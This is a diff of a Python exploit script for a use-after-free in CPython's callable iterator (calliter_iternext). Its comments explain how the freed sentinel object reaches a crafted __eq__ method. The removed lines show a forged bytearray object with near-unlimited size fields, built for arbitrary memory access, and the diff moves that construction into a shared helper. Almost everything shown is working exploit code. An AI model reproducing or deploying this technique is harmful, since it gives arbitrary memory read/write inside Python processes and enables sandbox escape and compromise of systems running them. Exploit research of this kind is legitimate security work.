@@ -48,6 +48,8 @@ calliter_iternext(PyObject *op)
 # and raises StopIteration which clears it->it_sentinel. Once it's cleared, we return to our python function and return NotImplemented
 # so that it'll pass it to `catch.__eq__` which will receive the freed object (it->it_sentinel) as the `other` arg.
 
+from common import evil_bytearray_obj
+
 class catch:
     def __eq__(self, other):
         global mem
@@ -80,15 +82,8 @@ class evil(bytes):
         # freed object (now our fake obj) will be received in catch.__eq__
         return NotImplemented
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_obj = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
 
 SIZE = 0x100
 it = iter(lambda: catch(), evil(SIZE - 0x18))
